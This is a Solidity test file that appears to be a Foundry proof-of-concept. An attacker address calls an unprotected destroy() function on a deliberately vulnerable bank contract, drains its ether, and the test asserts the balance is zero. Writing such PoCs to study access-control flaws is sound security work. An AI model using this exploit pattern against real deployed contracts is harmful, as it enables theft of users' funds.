// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;
import "./basetest.sol";
import "../src/VulnerableBank.sol";

contract PocTest is BaseTestWithBalanceLog {
    VulnerableBank target;
    address attacker = address(0xBAD);
    
    function setUp() public {
        target = new VulnerableBank();
        vm.deal(attacker, 10 ether);
        target.setBalance(address(target), 1 ether); // Fund the contract
    }
    
    function testExploit() public balanceLog {
        vm.startPrank(attacker);
        target.destroy(); // Reclaim funds through unauthorized self-destruction
        vm.stopPrank();
        
        assertEq(address(target).balance, 0); // Assert that all funds have been reclaimed
    }
}